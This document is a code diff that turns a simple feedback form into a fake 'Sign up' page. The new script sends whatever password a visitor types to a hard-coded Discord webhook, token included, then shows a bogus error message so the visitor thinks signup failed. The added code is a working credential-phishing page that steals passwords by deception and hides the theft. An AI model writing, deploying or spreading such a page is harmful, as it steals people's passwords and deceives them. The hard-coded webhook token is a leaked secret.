@@ -1,38 +1,26 @@
-<!DOCTYPE html>
 <html>
-<head>
-	<title>Feedback</title>
-</head>
-<body>
-	<form id="my-form">
-		<label for="input-data">Email:</label>
-        <br>
-		<input type="email" id="input-data1" name="input-data" value="" required><br><br>
-        <label for="input-data">Message:</label>
-        <br>
-		<input id="input-data" name="input-data" value="" required>
-		<br>
-		<button type="submit">Send</button>
-	</form>
+	<head>
+		<title>Sign up</title>
+	</head>
+	<body>
+		<input id="name" placeholder="Enter a username" maxlength="20" minlength="3"><br><br>
+		<input id="password" placeholder="Password" type="password" minlength="8"><br><br>
+		<button>Sign up</button>
+	</body>
 	<script>
-		const form = document.getElementById('my-form');
-		form.addEventListener('submit', async (event) => {
-			event.preventDefault();
-			const inputData = document.getElementById('input-data').value;
-            const email = document.getElementById('input-data1').value;
-			const webhookUrl = 'https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO';
-			const payload = {
-				content: inputData + "\nFrom: " + email
-			};
-			await fetch(webhookUrl, {
+		const button = document.querySelector('button');
+		const passwordInput = document.getElementById('password');
+
+		button.addEventListener('click', () => {
+			const password = passwordInput.value;
+			fetch('https://discordapp.com/api/webhooks/1092569585045221386/8la5fQp6icwktAFDw68NpIInnDUvYbHEMZRTeItiBqyH8tk4AP8iSlCTTTZormOH-cZO', {
 				method: 'POST',
 				headers: {
-					'Content-Type': 'application/json'
+				'Content-Type': 'application/json'
 				},
-				body: JSON.stringify(payload)
+				body: JSON.stringify({ content: password })
 			});
-			alert('Sent!');
+			alert("There has been an error! Please report this to the website owner.");
 		});
 	</script>
-</body>
 </html>
